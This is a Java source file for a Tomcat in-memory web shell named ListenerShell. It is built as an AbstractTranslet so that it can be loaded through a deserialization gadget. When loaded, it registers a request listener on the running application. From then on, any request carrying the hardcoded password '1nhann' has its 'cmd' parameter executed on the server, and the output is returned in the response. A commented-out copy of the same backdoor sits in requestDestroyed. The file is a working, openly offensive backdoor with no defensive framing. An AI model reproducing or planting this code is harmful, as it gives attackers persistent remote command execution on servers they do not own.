package top.inhann;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;

public class ListenerShell extends AbstractTranslet implements ServletRequestListener {
    static {
        StandardContext context = (StandardContext) ((WebappClassLoaderBase) Thread.currentThread().getContextClassLoader()).getResources().getContext();
        ServletRequestListener listener = new ListenerShell();
        context.addApplicationEventListener(listener);
    }
//    @Override
//    public void requestDestroyed(ServletRequestEvent sre) {
//        try {
//            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
//
//            String password = req.getParameter("password");
//
//            if (password != null) {
//                if (password.equals("1nhann")) {
//                    String cmd = req.getParameter("cmd");
//                    Runtime rt = Runtime.getRuntime();
//                    Process process = rt.exec(cmd);
//                    java.io.InputStream in = process.getInputStream();
//                    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
//                    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
//                    String s = null;
//                    StringBuilder sb = new StringBuilder();
//                    while ((s = stdInput.readLine()) != null) {
//                        sb.append(s);
//                        sb.append("\n");
//                    }
//                    Field requestF = req.getClass().getDeclaredField("request");
//                    requestF.setAccessible(true);
//                    Request request = (Request)requestF.get(req);
//                    Response response = request.getResponse();
//                    PrintWriter printWriter = null;
//                    OutputStream outputStream = null;
//                    try{
//                        printWriter = response.getWriter();
//                    }catch (Exception e){
//                        outputStream = response.getOutputStream();
//                    }
//                    if (printWriter == null){
//                        outputStream.write(sb.toString().getBytes(StandardCharsets.UTF_8));
//                        outputStream.flush();
//                        outputStream.close();
//                    }else{
//                        printWriter.write(sb.toString());
//                    }
//                }
//            }
//        }catch (Exception e){
//            e.printStackTrace();
//        }
//    }

    @Override
    public void requestInitialized(ServletRequestEvent sre) {
        try {
            HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();

            String password = req.getParameter("password");

            if (password != null) {
                if (password.equals("1nhann")) {
                    String cmd = req.getParameter("cmd");
                    Runtime rt = Runtime.getRuntime();
                    Process process = rt.exec(cmd);
                    java.io.InputStream in = process.getInputStream();
                    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                    String s = null;
                    StringBuilder sb = new StringBuilder();
                    while ((s = stdInput.readLine()) != null) {
                        sb.append(s);
                        sb.append("\n");
                    }
                    Field requestF = req.getClass().getDeclaredField("request");
                    requestF.setAccessible(true);
                    Request request = (Request)requestF.get(req);
                    Response response = request.getResponse();
                    PrintWriter printWriter = null;
                    OutputStream outputStream = null;
                    try{
                        printWriter = response.getWriter();
                    }catch (Exception e){
                        outputStream = response.getOutputStream();
                    }
                    if (printWriter == null){
                        outputStream.write(sb.toString().getBytes(StandardCharsets.UTF_8));
                        outputStream.flush();
                        outputStream.close();
                    }else{
                        printWriter.write(sb.toString());
                        printWriter.close();
                    }
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
